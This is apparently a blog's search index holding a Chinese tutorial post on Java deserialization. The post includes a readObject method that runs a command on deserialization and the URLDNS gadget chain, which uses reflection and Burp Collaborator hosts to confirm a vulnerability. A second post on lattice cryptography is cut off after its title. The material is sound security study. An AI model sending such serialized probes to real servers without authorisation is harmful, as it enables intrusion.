<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【JavaSec】反序列化初探（配合URLDNS）</title>
      <link href="/2024/08/17/2024-08-17-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A20x00/"/>
      <url>/2024/08/17/2024-08-17-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A20x00/</url>
      
        <content type="html"><![CDATA[<h2 id="javasec反序列化初探-配合urldns">JavaSec反序列化初探（配合URLDNS）</h2><h3 id="基本demo">基本demo</h3><p>构建一个demo</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127541.png" alt="image-20240814204824282"></p><p>实体类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bli_seri;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bli_seri;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;happy&quot;</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//正常打印</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line"><span class="comment">//        serialize(person);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bli_seri;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能反序列化成功 有一个要求</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127543.png" alt="image-20240814213020625"></p><p>这个实体类 必须实现这个接口</p><p>尝试去掉以后就会报错：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127544.png" alt="image-20240814213140442"></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127545.png" alt="image-20240814213718936"></p><p>虽然这个接口是空的，但是必须要声明一下</p><p>注意点：当使用<code>transient</code>标记时 不会被序列化存储</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127546.png" alt="image-20240814215010552"></p><p>反序列化产生安全问题的原因：</p><p>服务端反序列化数据，其中传递类的readObject中的代码会自动执行，下面给个弹计算机的例子</p><p>在待反序列化的实体类中 重写readObject方法</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bli_seri;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>有趣的点：</p><p>这里虽然说着重写readObject方法，但是为什么没有加Override的注解，这里的重写，真的是重写方法的意思吗</p><p>去看实体类中的奇怪接口Serializable的文档 看到我们readObject方法</p><p>翻译开头：在序列化和反序列化过程中需要特殊处理的类必须实现具有以下确切签名的特殊方法：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127547.png" alt="image-20240814234344116"></p><p>这里所说的重写<code>readObject()</code>方法，并不是说重写父类中的方法，而是我们自定义个一个private修饰的<code>readObject()</code>方法，在反序列化的过程中检测到我们程序中存在private修饰的<code>readObject()</code>方法，就会去调用我们自定义的<code>readObject()</code>方法，如果没检测到，则将调用默认的<code>defaultReadFields</code>方法来读取目标类中的属性。</p><p>参考：<a href="https://xz.aliyun.com/t/14544?time__1311=GqAhDIkGkFGXwqeu4Yq7KG%3DmMizNDRO7bD">https://xz.aliyun.com/t/14544?time__1311=GqAhDIkGkFGXwqeu4Yq7KG%3DmMizNDRO7bD</a></p></blockquote><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127548.png" alt="image-20240814234629152"></p><p>成功弹计算器了</p><hr><p>但是上面这种如此直白的 肯定一般不存在，我们都需要找一个入口类，下面介绍一个初级的入口类</p><p>三步走战略：</p><p>入口类Source =&gt; 调用链Gadget chain =&gt; 执行类 sink</p><h3 id="map入口类">Map入口类</h3><p>在HashMap.java中存在重写</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127549.png" alt="image-20240815002546275"></p><p>看一个实例 URLDNS</p><blockquote><p>效果：服务器接收到传入的值，然后反序列化后，收到对服务器发起的请求，证明服务器存在反序列化漏洞</p></blockquote><blockquote><p>先理解一下URL</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127550.png" alt="image-20240815003827454"></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127551.png" alt="image-20240815003833561"></p><p>实现了Serializable 可以进行反序列化 有希望！</p></blockquote><p>去URL中有一个hashCode方法</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127552.png" alt="image-20240816004652518"></p><p>这个方法的 先验证hashCode是否为-1  如果不等于-1  直接返回hashCode值</p><p>否则进入handler中的hashCode方法</p><p>注意：这里的默认初始值是-1</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127553.png" alt="image-20240816005108117"></p><p>下面对这个序列化的过程 打个断点调试一下</p><p>put之前 hashCode还是-1</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127554.png" alt="image-20240816210010228"></p><blockquote><p>我们的本意想法是，注入一个恶意的访问地址，然后序列化传入，在服务器反序列化解析时发起请求</p></blockquote><p>只要执行 调用hash函数 =&gt; 此时hashcode还是-1 =&gt; 调用hashCode方法  =&gt; 发起DNS请求（误导）</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127555.png" alt="image-20240816211638496"></p><p>所以这里在序列化的时候，在本地就会请求一次，下面进行证明：</p><p>利用burp生成一个验证网址</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127556.png" alt="image-20240817001552431"></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127557.png" alt="image-20240817001632691"></p><p>序列化代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bli_seri;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;happy&quot;</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个hashMap 类型是URL 和 整数类</span></span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="comment">// -1</span></span><br><span class="line">        hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://eo63b7ig3mijlg6o44imrl6mpdv4jt.burpcollaborator.net&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127558.png" alt="image-20240817001740051"></p><p>序列化成功捕获 但是不清楚为什么这么多</p><blockquote><p>这个地方做一个避坑，一开始开代理了，导致burp一直收不到</p></blockquote><p>但是执行结束后，hashCode变成其他值（一put 就改变）</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127559.png" alt="image-20240816211005407"></p><p>导致反序列化时 根本收不到请求</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127560.png" alt="image-20240817002139870"></p><p>那么如何才能成功利用呢</p><ol><li>在put时不要发起请求，导致误导我们</li><li>put之后吧hashCode改回-1   =&gt;  通过java的反射技术 改变已有对象的属性</li></ol><h3 id="java反射">Java反射</h3><p>继上次 URLDNS的利用  想要继续操作 就要学习java反射</p><p>注意点：</p><p>四步走战略</p><ol><li>反射就是操作Class</li><li>从原型Class里面实例化对象</li><li>获取类里面的属性</li><li>调用类里面的方法</li></ol><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bli_seri;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        System.out.println(person);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 反射就是操作Class</span></span><br><span class="line">        <span class="comment">//获取原型Class</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 从原型Class 里面实例化对象  参数分别是对应值的类型 String int</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//赋值</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;newhappy&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 获取类里面属性  注意：这里getFields只能获得属性为public的</span></span><br><span class="line">        <span class="comment">//使用getDeclaredFields就会全部打印</span></span><br><span class="line">        Field[] personfields = c.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f : personfields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改值</span></span><br><span class="line">        <span class="comment">//public String name的值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        namefield.set(p,<span class="string">&quot;newnewhappy&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//对于私有 private int age 可以设置</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">agefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        agefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        agefield.set(p, <span class="number">18</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. 调用类里面的方法</span></span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        Method[] personMethods = c.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method m : personMethods)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//单独public输出</span></span><br><span class="line"><span class="comment">//        Method actionmethod = c.getMethod(&quot;action&quot;, String.class);  //要表明接受什么类型的参数</span></span><br><span class="line"><span class="comment">//        actionmethod.invoke(p, &quot;test&quot;);    //调用  参数：一个对象 一个参数(调用方法的参数)</span></span><br><span class="line">        <span class="comment">//私有输出</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionmethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);  <span class="comment">//要表明接受什么类型的参数</span></span><br><span class="line">        actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        actionmethod.invoke(p, <span class="string">&quot;test&quot;</span>);    <span class="comment">//调用  参数：一个对象 一个参数(调用方法的参数)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>掌握了上面的技能，下面对URLDNS的那个进行修改</p><p>把URL的注册放到外面，这样在进入put前 我们需要把hashcode进行修改 在这直接插入语句</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127561.png" alt="image-20240817104000231"></p><p>可以看到new完之后 hashCode值为-1</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127562.png" alt="image-20240817105020771"></p><p>后面修改成功</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127563.png" alt="image-20240817105130473"></p><p>最后put结束  改为-1  目的时让反序列化时读取hashcode的值为-1 才能使得反序列化时发起请求</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127564.png" alt="image-20240817105905871"></p><p>实例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bli_seri;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;happy&quot;</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个hashMap 类型是URL 和 整数类</span></span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="comment">// -1 这里之所以发出请求 是因为put时 hashcode还是-1  所以应该先改hashcode</span></span><br><span class="line"><span class="comment">//        hashMap.put(new URL(&quot;http://eo63b7ig3mijlg6o44imrl6mpdv4jt.burpcollaborator.net&quot;),1);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化时不应该收到请求</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://ddu2067fsl7iafvnt37lgkvleck48t.burpcollaborator.net&quot;</span>);   <span class="comment">//此时 hashcode被修改 仍为-1  待会put时会发出请求   所以要修改</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodeField.set(url,<span class="number">666</span>);</span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用反射 修改值 把hashcode 改回 -1  这样反序列化时才能收到请求</span></span><br><span class="line">        hashcodeField.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结一下URLDNS的原理：</p><p>在URL类中 有一个危险函数<code>hashCode()</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127565.png" alt="image-20240817112307727"></p><p>如果hashCode不为-1 不会触发handler.hashCode</p><p>否则hashCode只要为-1 就会触发的话会导致</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408171127566.png" alt="image-20240817112431363"></p><p>这个地方发出请求</p></blockquote><p>参考：</p><p>漏洞库：<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p>视频：<a href="https://www.bilibili.com/video/BV16h411z7o9/?p=2&amp;spm_id_from=pageDriver&amp;vd_source=a4aea8ec409c6984f7f8011ef9e58ac4">https://www.bilibili.com/video/BV16h411z7o9/?p=2&amp;spm_id_from=pageDriver&amp;vd_source=a4aea8ec409c6984f7f8011ef9e58ac4</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF-Crypto】格密码基础（例题较多，非常适合入门！）</title>
      <link href="/2024/08/02/2024-08-02-%E6%A0%BC%E5%AF%86%E7%A0%81%E7%9B%B8%E5%85%B3/"/>
      <url>/2024/08/02/2024-08-02-%E6%A0%BC%E5%AF%86%E7%A0%81%E7%9B%B8%E5%85%B3/</url>
      
